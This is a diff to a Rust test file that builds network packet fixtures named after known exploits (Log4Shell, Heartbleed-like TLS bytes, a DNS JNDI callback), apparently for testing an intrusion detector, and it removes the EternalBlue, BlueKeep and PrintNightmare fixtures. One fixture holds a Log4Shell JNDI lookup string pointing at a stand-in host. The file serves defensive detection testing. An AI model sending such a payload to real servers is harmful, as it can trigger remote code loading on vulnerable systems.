@@ -27,12 +27,6 @@ fn packet(protocol: &str, destination_port: u16, info: &str, bytes: Vec<u8>) -> 
 
 fn fixture(name: &str) -> Packet {
     match name {
-        "EternalBlue" => packet("SMB", 445, "", b"prefixSMBrsuffix".to_vec()),
-        "BlueKeep (CVE-2019-0708)" => {
-            let mut bytes = vec![0_u8; 120];
-            bytes[..3].copy_from_slice(&[0x03, 0x00, 0x00]);
-            packet("RDP", 3389, "", bytes)
-        }
         "Log4Shell (CVE-2021-44228)" => {
             packet("HTTP", 8080, "", b"${jndi:ldap://example.test/x}".to_vec())
         }
@@ -49,7 +43,6 @@ fn fixture(name: &str) -> Packet {
             "",
             vec![0x18, 0x03, 0x02, 0xff, 0xff, 0x01, 0x00],
         ),
-        "PrintNightmare (CVE-2021-1675)" => packet("SMB", 445, "", b"\x1c\x00SpoolSS".to_vec()),
         "Log4Shell via DNS (CVE-2021-44228)" => {
             packet("DNS", 53, "query jndi callback", vec![0; 20])
         }
